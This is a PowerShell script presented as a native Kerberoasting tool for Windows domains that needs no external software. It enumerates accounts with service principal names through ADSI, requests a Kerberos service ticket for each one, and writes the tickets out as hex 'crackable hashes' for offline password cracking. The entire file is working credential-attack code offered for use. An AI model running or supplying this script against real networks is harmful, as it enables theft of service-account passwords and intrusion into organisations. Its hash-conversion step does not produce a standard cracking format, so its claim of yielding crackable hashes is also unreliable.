<#
Native Kerberoasting Script
No Rubeus, No External Tools
Generates crackable hashes for SPN-enabled accounts
#>

Write-Host "[+] Starting native Kerberoasting..." -ForegroundColor Green

# ----------------------------------------------
# STEP 1 - Enumerate SPN-enabled accounts (No RSAT required)
# ----------------------------------------------

Write-Host "[+] Enumerating SPN accounts via ADSI..."

$domain = [ADSI]"LDAP://$( (Get-WmiObject Win32_ComputerSystem).Domain )"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($domain)
$searcher.Filter = "(servicePrincipalName=*)"
$searcher.PageSize = 2000
$results = $searcher.FindAll()

$SPNs = @()

foreach ($item in $results) {
    $sam = $item.Properties.samaccountname
    $spnList = $item.Properties.serviceprincipalname

    foreach ($spn in $spnList) {
        $obj = [PSCustomObject]@{
            SamAccountName = $sam
            SPN = $spn
        }
        $SPNs += $obj
    }
}

$SPNs | Format-Table -AutoSize

Write-Host "`n[+] Found $($SPNs.Count) SPNs" -ForegroundColor Yellow

# ----------------------------------------------
# STEP 2 - Request a Kerberos TGS for each SPN
# ----------------------------------------------

Add-Type -AssemblyName System.IdentityModel

$OutputDir = ".\Kerberoast-Output"
if (!(Test-Path $OutputDir)) { New-Item -ItemType Directory $OutputDir | Out-Null }

foreach ($entry in $SPNs) {

    $spn = $entry.SPN
    $user = $entry.SamAccountName

    Write-Host "[+] Requesting TGS for SPN: $spn (User: $user)" -ForegroundColor Cyan

    try {
        # Request the Kerberos ticket natively
        $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken($spn)

        # Convert ticket to Base64
        $b64 = [System.Convert]::ToBase64String($token.GetRequest())

        $outFile = "$OutputDir\$($user)-$($spn.Replace("/","_").Replace(":","_")).b64"
        $b64 | Out-File $outFile

        Write-Host "    [+] Ticket saved: $outFile" -ForegroundColor Green

    } catch {
        Write-Host "    [!] Failed to request ticket for $spn" -ForegroundColor Red
    }
}

# ----------------------------------------------
# STEP 3 - Convert Base64 tickets into crackable hex hashes
# ----------------------------------------------

Write-Host "`n[+] Converting Base64 tickets into crackable hashes..."

$HashOutput = "$OutputDir\kerberoast_hashes.txt"
if (Test-Path $HashOutput) { Remove-Item $HashOutput }

$files = Get-ChildItem $OutputDir -Filter *.b64

foreach ($file in $files) {

    Write-Host "[+] Processing $($file.Name)"

    $b64 = Get-Content $file.FullName -Raw
    $bytes = [System.Convert]::FromBase64String($b64)

    # Convert bytes → hex
    $hex = ($bytes | ForEach-Object { "{0:x2}" -f $_ }) -join ""

    # Create hash line
    $hash = "kerberoast:$hex"

    # Write to output file
    Add-Content -Path $HashOutput -Value $hash
}

Write-Host "`n[+] Hash file written: $HashOutput" -ForegroundColor Green
Write-Host "[+] Kerberoasting Complete!" -ForegroundColor Green
